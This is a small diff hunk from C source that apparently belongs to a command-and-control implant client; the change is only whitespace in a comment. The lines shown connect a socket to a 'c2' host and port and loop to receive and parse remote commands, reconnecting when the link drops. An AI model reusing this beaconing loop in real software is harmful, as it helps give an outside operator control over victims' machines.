@@ -162,7 +162,7 @@ int main(void) {
 		SOCKET connect_socket = create_socket();
 
 		/* If connected to c2 recursively loop to receive/parse c2 commands. If an error-
-           occurs (connection lost, etc) break the loop and reconnect & restart loop. */
+           	   occurs (connection lost, etc) break the loop and reconnect & restart loop. */
 		if (connect_socket != INVALID_SOCKET) {
 			int iResult = c2_connect(connect_socket, host, port);
 			while (iResult > 0) {
